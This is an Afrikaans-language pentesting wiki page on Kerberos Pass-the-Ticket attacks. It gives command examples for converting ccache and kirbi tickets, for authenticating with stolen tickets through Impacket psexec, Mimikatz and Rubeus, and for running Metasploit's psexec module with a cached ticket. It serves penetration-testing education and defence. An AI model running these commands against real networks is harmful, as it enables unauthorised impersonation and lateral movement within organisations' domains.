# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

In ’n Pass-the-Ticket (PtT)-aanval gebruik ’n aanvaller ’n gesteelde Kerberos-ticket om as die ticket se principal te autentiseer sonder om daardie rekening se wagwoord te hê. ’n Ticket-granting ticket (TGT) kan gebruik word om dienstickets aan te vra, terwyl ’n gesteelde diensticket beperk is tot sy teikendiens en geldigheidstydperk.<sup>[[1]](#references)</sup>

Sien die volgende vir tegnieke om tickets te verkry:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Omskakeling tussen Linux- en Windows-ticketformate

Kerberos-kasgeheues verskyn gewoonlik as MIT `ccache`-lêers op Linux en `.kirbi`-lêers op Windows. `ticket_converter` skakel tussen hierdie formate om deur ’n invoerticket en uitvoerpad te gebruik.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo bied ook nutsgoed vir Kerberos-tickets op Windows.<sup>[[3]](#references)</sup>

## Gebruik van 'n Ticket

Stel op Linux `KRB5CCNAME` na die kas en gee 'n Impacket-kliënt die opdrag om Kerberos te gebruik sonder om vir 'n wagwoord te vra:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Op Windows kan Mimikatz of Rubeus ’n `.kirbi`-ticket in die huidige aanmeldingsessie invoer. Gebruik `klist` om die resulterende kas te inspekteer.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Ticket-invoer verleen nie voorregte buiten dié wat deur die ticket en die teikendiens se magtigingsbeleid verteenwoordig word nie. Vervalde, herroepe, verkeerd geformateerde of verkeerd begrensde tickets kan misluk.<sup>[[1]](#references)</sup>

Vir breër konteks oor Kerberos-aanvalle en verwante tegnieke om tickets te bekom, sien Tarlogic se Kerberos-aanvalsgids.<sup>[[7]](#references)</sup>

### Hergebruik van ’n eksterne ticket in Metasploit

Metasploit lees nie Impacket se `KRB5CCNAME` outomaties vir sy Kerberos-modules nie. Voorsien die module van ’n **ccache-lêer** via sy protokolspesifieke `::Krb5Ccname`-opsie. Stel `::Rhostname` op die SPN-gasheernaam van die teiken en die domein op die teikendomein; `RHOST` kan steeds die teiken-IP wees. Só kan ’n reeds verkrygde ticket gebruik word sonder om die rekeningwagwoord in te voer.<sup>[[8]](#references)</sup>

Skakel eers ’n `.kirbi` na ’n ccache om indien nodig.<sup>[[9]](#references)</sup>

Voer byvoorbeeld die [SMB PsExec-module](../lateral-movement/psexec-and-winexec.md) met daardie cache uit as jy ’n ticket het vir ’n rekening wat toegelaat word om dienste op die teiken te skep:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit kies eers ’n ooreenstemmende service ticket uit die verskafde cache. As dit net ’n TGT vind, versoek dit ’n service ticket van die KDC, dus benodig dié pad ook verbinding met ’n DC. ’n Cache wat slegs ’n service ticket bevat, bied nie toegang tot onverwante gashere nie. Vir ander ondersteunde modules, verander die opsievoorvoegsel (byvoorbeeld, `Winrm::Krb5Ccname` vir [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket-voorbeelde](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos-aanvalstegnieke](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Diensverifikasie](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Omskakeling van kirbi- en ccache-lêers](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMB-kliënt-Kerberos-implementering](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
